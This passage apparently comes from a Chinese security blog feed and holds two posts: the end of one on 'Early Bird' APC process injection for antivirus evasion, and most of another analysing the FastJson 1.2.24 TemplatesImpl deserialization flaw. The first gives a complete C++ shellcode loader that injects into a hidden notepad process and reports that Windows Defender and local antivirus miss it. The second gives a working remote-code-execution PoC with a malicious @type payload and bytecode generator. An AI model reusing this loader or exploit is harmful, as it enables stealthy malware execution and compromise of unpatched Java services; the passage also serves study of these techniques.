class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">BOOL </span>CreateProcessA(<br>  LPCSTR                lpApplicationName,<br>  LPSTR                 lpCommandLine,<br>  LPSECURITY_ATTRIBUTES lpProcessAttributes,<br>  LPSECURITY_ATTRIBUTES lpThreadAttributes,<br>  <span class="hljs-keyword">BOOL </span>                 <span class="hljs-keyword">bInheritHandles,</span><br><span class="hljs-keyword"> </span> DWORD                 dwCreationFlags,<br>  LPVOID                lpEnvironment,<br>  LPCSTR                lpCurrentDirectory,<br>  LPSTARTUPINFOA        lpStartupInfo,<br>  LPPROCESS_INFORMATION lpProcessInformation<br>);<br></code></pre></td></tr></table></figure><p>申请内存API</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">LPVOID VirtualAllocEx(<br>  HANDLE hProcess,<br>  LPVOID lpAddress,<br>  SIZE_T dwSize,<br>  <span class="hljs-built_in">DWORD</span>  flAllocationType,<br>  <span class="hljs-built_in">DWORD</span>  flProtect<br>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>在指定的进程中将数据写入内存区域。</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lasso">BOOL WriteProcessMemory(<br>  <span class="hljs-keyword">HANDLE</span>  hProcess,<br>  LPVOID  lpBaseAddress,<br>  LPCVOID lpBuffer,<br>  SIZE_T  nSize,<br>  SIZE_T  *lpNumberOfBytesWritten<br>);<br></code></pre></td></tr></table></figure><p>本次实验的重点：<code>QueueUserAPC</code></p><p>将用户模式异步过程调用（APC）对象添加到指定线程的APC队列中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function">DWORD <span class="hljs-title">QueueUserAPC</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  PAPCFUNC  pfnAPC,</span></span><br><span class="hljs-function"><span class="hljs-params">  HANDLE    hThread,</span></span><br><span class="hljs-function"><span class="hljs-params">  ULONG_PTR dwData</span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></td></tr></table></figure><p>本次实验用来恢复挂起的进程的线程。</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">DWORD</span> <span class="hljs-function"><span class="hljs-title">ResumeThread</span>(</span><br><span class="hljs-function">  <span class="hljs-variable">HANDLE</span> <span class="hljs-variable">hThread</span></span><br><span class="hljs-function">);</span><br></code></pre></td></tr></table></figure><h2 id="3-完整代码"><a href="#3-完整代码" class="headerlink" title="3.完整代码"></a>3.完整代码</h2><p>如下代码还是将<code>shellcode</code>和加载器进行分离。如下代码作为示例，所以我并没有将我们的<code>shellcode</code>进行加密操作。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tchar.h&gt;</span></span><br><br><br><span class="hljs-keyword">int</span> _tmain(<span class="hljs-keyword">int</span> argc, _TCHAR* argv[]) &#123;<br><span class="hljs-comment">//获取shellcode</span><br>DWORD dwread = <span class="hljs-number">0</span>;<br>HANDLE  hFile = CreateFile(argv[<span class="hljs-number">1</span>], GENERIC_ALL, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>DWORD shellcode_size = GetFileSize(hFile, <span class="hljs-literal">NULL</span>);<br>LPVOID shellcode = VirtualAlloc(<span class="hljs-literal">NULL</span>, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>ReadFile(hFile, shellcode, shellcode_size, &amp;dwread, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-comment">// Create a 64-bit process: </span><br>STARTUPINFOA si;<br>PROCESS_INFORMATION pi;<br>LPVOID shellcode_memory;<br>SIZE_T memory_size = (SIZE_T)shellcode_size;<br>HANDLE hProcess, hThread;<br><br><br>ZeroMemory(&amp;si, <span class="hljs-keyword">sizeof</span>(si));<br>ZeroMemory(&amp;pi, <span class="hljs-keyword">sizeof</span>(pi));<br><br><br>si.cb = <span class="hljs-keyword">sizeof</span>(si);<br>si.dwFlags = STARTF_USESHOWWINDOW;<br>si.wShowWindow = SW_HIDE;<br><br><br>CreateProcessA(<span class="hljs-string">&quot;C:\\windows\\system32\\notepad.exe&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE,<br>CREATE_NO_WINDOW, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi);<br><br><span class="hljs-comment">//Execute the process</span><br>shellcode_memory = VirtualAllocEx(pi.hProcess, <span class="hljs-literal">NULL</span>, memory_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>WriteProcessMemory(pi.hProcess, shellcode_memory, shellcode, memory_size, <span class="hljs-literal">NULL</span>);<br>QueueUserAPC((PAPCFUNC)shellcode_memory, pi.hThread, <span class="hljs-literal">NULL</span>);<br>ResumeThread(pi.hThread);<br>CloseHandle(pi.hThread);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>成功连接。</p><p><img src="/2021/04/20/%E5%85%8D%E6%9D%80-%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5%E4%B9%8BEarly-BIRD%E6%8A%80%E6%9C%AF%E7%9A%84%E5%BA%94%E7%94%A8/1.png"></p><p>其实仔细阅读代码，可以发现APC（异步过程调用）在其中的作用可以说是替代了<code>CreateRemoteThread</code>方法。</p><h2 id="4-配合加密的查杀效果"><a href="#4-配合加密的查杀效果" class="headerlink" title="4.配合加密的查杀效果"></a>4.配合加密的查杀效果</h2><p>windows defender是没有查杀到的。</p><p><img src="/2021/04/20/%E5%85%8D%E6%9D%80-%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5%E4%B9%8BEarly-BIRD%E6%8A%80%E6%9C%AF%E7%9A%84%E5%BA%94%E7%94%A8/2.png"></p><p>常见的国产杀软没有查到</p><p><img src="/2021/04/20/%E5%85%8D%E6%9D%80-%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5%E4%B9%8BEarly-BIRD%E6%8A%80%E6%9C%AF%E7%9A%84%E5%BA%94%E7%94%A8/3.png"></p><h1 id="3-完整程序链接"><a href="#3-完整程序链接" class="headerlink" title="3.完整程序链接"></a>3.完整程序链接</h1><p><a href="https://github.com/ReadER-L/BypassSecuritySoftware">https://github.com/ReadER-L/BypassSecuritySoftware</a></p><h1 id="4-参考链接"><a href="#4-参考链接" class="headerlink" title="4.参考链接"></a>4.参考链接</h1><p><a href="https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls">https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls</a></p><p><a href="https://idiotc4t.com/code-and-dll-process-injection/apc-injection#apc-jian-jie">https://idiotc4t.com/code-and-dll-process-injection/apc-injection#apc-jian-jie</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-Early-Bird简介&quot;&gt;&lt;a href=&quot;#1-Early-Bird简介&quot; class=&quot;headerlink&quot; title=&quot;1.Early Bird简介&quot;&gt;&lt;/a&gt;1.Early Bird简介&lt;/h1&gt;&lt;p&gt;​    Early Bird是一种简单而强</summary>
      
    
    
    
    <category term="免杀" scheme="https://reader-l.github.io/categories/%E5%85%8D%E6%9D%80/"/>
    
    
  </entry>
  
  <entry>
    <title>FastJason-1.2.22-1.2.24-TemplatesImpl利用链分析</title>
    <link href="https://reader-l.github.io/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>https://reader-l.github.io/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2021-04-17T11:00:23.000Z</published>
    <updated>2021-04-24T07:54:27.435Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    FastJson是alibaba的一款开源JSON解析库，可用于将Java对象转换为其JSON表示形式，也可以用于将JSON字符串转换为等效的Java对象。</p><p>​    这几年一直都有听说过fastjson出现过RCE的漏洞，但是都没有好好仔细的研究学习。最近打算好好阅读大佬们的文章进行学习。</p><h1 id="2-FastJson简单使用及分析"><a href="#2-FastJson简单使用及分析" class="headerlink" title="2.FastJson简单使用及分析"></a>2.FastJson简单使用及分析</h1><h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h2><p>​    用IDEA的Maven创建一个空的项目后，在pom.xml中添加依赖。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.24<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1.png"></p><h2 id="2-简单的序列化和反序列化"><a href="#2-简单的序列化和反序列化" class="headerlink" title="2.简单的序列化和反序列化"></a>2.简单的序列化和反序列化</h2><h3 id="1-序列化"><a href="#1-序列化" class="headerlink" title="1.序列化"></a>1.序列化</h3><p>Persion Demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> FastjsonTest;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String Id;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了构造方法&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUserId</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;调用getUserId方法&quot;</span>);<br>        <span class="hljs-keyword">return</span> Id;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUserId</span><span class="hljs-params">(String id)</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;调用setUserId&quot;</span>);<br>        <span class="hljs-keyword">this</span>.Id = id;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;UserId&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;UserId=&#x27;&quot;</span> + Id + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>​    我们尝试调用FastJson的序列化方法：<code>JSON.toJSONString()</code>将对象序列化成Json字符串，发现<code>FastJson</code>会在序列化的过程中自动调用了类中的 <code>getter</code>构造函数。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/2.png"></p><h3 id="2-反序列化"><a href="#2-反序列化" class="headerlink" title="2.反序列化"></a>2.反序列化</h3><p>反序列化有两个方法，分别是<code>JSON.parseObject()</code>、<code>JSON.paese()</code>。</p><h4 id="这两个方法是有区别的："><a href="#这两个方法是有区别的：" class="headerlink" title="这两个方法是有区别的："></a>这两个方法是有区别的：</h4><p>1.反序列化数据的时候，调用目标类的方法不同。（主要原因在<code>@type</code>参数，下文分析。）</p><p>调用<code>JSON.parseObject()</code>反序列化数据的时候，会直接调用<code>setter</code>和<code>getter</code>方法，同时会调用构造方法。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/3.png"></p><p>调用<code>JSON.parse()</code>反序列化数据的时候，会直接调用构造方法以及<code>setter</code>方法。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/4.png"></p><p>2.这两个方法返回的对象是不同的。</p><p><code>JSON.parseObject()</code>返回的类是<code>com.alibaba.fastjson.JSONObject</code></p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/5.png"></p><p><code>JSON.parse()</code>返回的类是<code>FastjsonTest.Person</code></p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/6.png"></p><p>但是我们可以通过在<code>JSON.parseObject()</code>方法的参数中传入<code>Object.class</code>，从而达到和parse相同的效果。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/7.png"></p><h2 id="3-type参数"><a href="#3-type参数" class="headerlink" title="3.@type参数"></a>3.@type参数</h2><p>​    我们在上面调用<code>JSON.parseObject()</code>和``JSON.parse()<code>方法时，我们有用到该参数。在</code>FastJson<code> 中有一个</code>@type<code> 参数，能将我们反序列化后的类转为</code>@type<code> 中指定的类，然后在反序列化过程中会自动调用类中的</code>setter<code> </code>getter` 和构造器。</p><p>​    尝试利用该特定调用恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> FastjsonTest;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String cmd;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Evil</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了构造方法&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setCmd</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        <span class="hljs-keyword">this</span>.cmd = cmd;<br>        Runtime.getRuntime().exec(<span class="hljs-keyword">this</span>.cmd);<br>        System.out.println(<span class="hljs-string">&quot;调用了setCmd方法&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getCmd</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了getCmd方法&quot;</span>);<br>        <span class="hljs-keyword">return</span> cmd;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/8.png"></p><h2 id="4-setter和getter方法自动调用的原因"><a href="#4-setter和getter方法自动调用的原因" class="headerlink" title="4.setter和getter方法自动调用的原因"></a>4.setter和getter方法自动调用的原因</h2><p>具体的原因可以看这篇文章： <a href="http://wjlshare.com/archives/1512#type">http://wjlshare.com/archives/1512#type</a></p><h2 id="5-JSON-parseObject方法有无Object-class属性的区别"><a href="#5-JSON-parseObject方法有无Object-class属性的区别" class="headerlink" title="5.JSON.parseObject方法有无Object.class属性的区别"></a>5.JSON.parseObject方法有无Object.class属性的区别</h2><p>​    上面文章有写过<code>JSON.parseObject</code>和<code>JSON.parse</code>的返回对象类是不一样的，为了让<code>JSON.parseObject()</code>返回的类是目标类而不是<code>com.alibaba.fastjson.JSONObject</code>。其实还可以发现，有无该参数与是否调用<code>getter</code>方法是有联系的。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/10.png"></p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/11.png"></p><h2 id="6-Feature-SupportNonPublicField属性"><a href="#6-Feature-SupportNonPublicField属性" class="headerlink" title="6.Feature.SupportNonPublicField属性"></a>6.Feature.SupportNonPublicField属性</h2><p>​    我们前面的例子都是在<code>setter</code>和<code>getter</code>以及相关属性为<code>public</code>的情况下，反序列化数据后触发了<code>setter</code>或者<code>getter</code>导致的命令执行。但是如果我们的属性或者<code>setter</code>以及<code>getter</code>方法是<code>private</code>呢？我们来看看两者的区别。</p><p>当属性<code>cmd</code>以及<code>setCmd</code>和<code>getCmd</code>都是<code>public</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> FastjsonTest;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> String cmd;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Evil</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了构造方法&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setCmd</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        <span class="hljs-keyword">this</span>.cmd = cmd;<br>        System.out.println(<span class="hljs-string">&quot;调用了setCmd方法&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getCmd</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了getCmd方法&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.cmd;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>注意：红框中的<code>getCmd</code>是代码 12行调用的。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/9.png"></p><p>当属性<code>cmd</code>和方法<code>setCmd</code>是<code>private</code>而<code>getCmd</code>是<code>public</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> FastjsonTest;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String cmd;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Evil</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了构造方法&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setCmd</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        <span class="hljs-keyword">this</span>.cmd = cmd;<br>        System.out.println(<span class="hljs-string">&quot;调用了setCmd方法&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getCmd</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了getCmd方法&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.cmd;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以发现，反序列化后，属性<code>cmd</code>并没有被赋值。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/12.png"></p><p><code>Feature.SupportNonPublicField</code>参数解决以上<code>private</code>的属性和<code>setter</code>没办法控制<code>private</code>属性的问题，</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/13.png"></p><h1 id="3-TemplatesImp利用POC分析"><a href="#3-TemplatesImp利用POC分析" class="headerlink" title="3.TemplatesImp利用POC分析"></a>3.TemplatesImp利用POC分析</h1><p>我们从下面的POC来进行分析学习吧：</p><p>以下POC起始也很好理解，关于<code>TemplatesImp</code>在反序列化的利用，我在关于CC2链的分析的文章也分析过。</p><h2 id="1-POC"><a href="#1-POC" class="headerlink" title="1.POC"></a>1.POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> FastjsonTest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Poc</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">generateEvil</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ClassPool pool = ClassPool.getDefault();<br>        CtClass clas = pool.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        String cmd = <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;deepin-calculator\&quot;);&quot;</span>;<br>        clas.makeClassInitializer().insertBefore(cmd);<br>        clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));<br><br>        clas.writeFile(<span class="hljs-string">&quot;./&quot;</span>);<br><br>        <span class="hljs-keyword">byte</span>[] bytes = clas.toBytecode();<br>        String EvilCode = Base64.getEncoder().encodeToString(bytes);<br>        System.out.println(EvilCode);<br>        <span class="hljs-keyword">return</span> EvilCode;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-keyword">final</span> String GADGAT_CLASS = <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br>        String evil = Poc.generateEvil();<br>        String PoC = <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + GADGAT_CLASS + <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evil + <span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> + <span class="hljs-string">&quot;\&quot;_name\&quot;:\&quot;a\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;</span>;<br>        JSON.parseObject(PoC,Object.class, Feature.SupportNonPublicField);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/14.png"></p><h2 id="2-后端程序反序列化触发条件"><a href="#2-后端程序反序列化触发条件" class="headerlink" 